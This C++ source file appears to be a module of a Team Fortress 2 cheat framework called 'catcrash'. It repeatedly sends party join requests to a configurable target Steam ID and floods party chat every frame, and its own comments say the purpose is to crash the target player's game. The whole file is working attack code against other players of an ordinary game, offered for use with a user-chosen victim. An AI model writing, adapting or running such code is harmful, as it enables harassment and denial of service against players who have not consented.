/*
 *  Created on 19th of October 21:10
 *  by BenCat07
 */

#include "init.hpp"
#include "Settings.hpp"
#include "HookTools.hpp"
#include "interfaces.hpp"
#include "AutoJoin.hpp"
#include "sdk.hpp"
#include "timer.hpp"
#include <string>

static settings::Boolean enabled{ "catcrash.enabled", "true" };
// Steamid to spam, modify to what you want
static settings::String steamid_to_spam{ "catcrash.steamid", "" };
// Text to spam
static settings::String spam_text{ "catcrash.spam-text", "bruh" };
// Used for join requests
static Timer join_request_spam{};

// constant strings that get reused
const std::string join_string = "tf_party_request_join_user";
const std::string chat_string = "tf_party_chat ";

// Semi-constant
static std::string join_command = join_string + " " + *steamid_to_spam;
static std::string spam_command = chat_string + " " + *spam_text;

// Main logic, tiny huh?
void ModuleLogic()
{
    if (!enabled)
        return;
    // Here's a way to stop besides enabled bool
    if (*steamid_to_spam == "0")
        return;
    // Try to join
    if (join_request_spam.test_and_set(1000))
    {
        g_IEngine->ClientCmd_Unrestricted(join_command.c_str());
    }

    // Crash them
    g_IEngine->ClientCmd_Unrestricted(spam_command.c_str());
#if !ENABLE_VISUALS
    hacks::shared::autojoin::queue_time.update();
#endif
}

// Init
static InitRoutine init([]() {
    // Set up Module Logic
    EC::Register(EC::Paint, ModuleLogic, "catcrash_main");

    steamid_to_spam.installChangeCallback([](settings::VariableBase<std::string> &, std::string after) {
        // Update only when needed
        join_command = join_string + " " + after;
    });
    spam_text.installChangeCallback([](settings::VariableBase<std::string> &, std::string after) {
        // Update only when needed
        spam_command = chat_string + " " + after;
    });
});
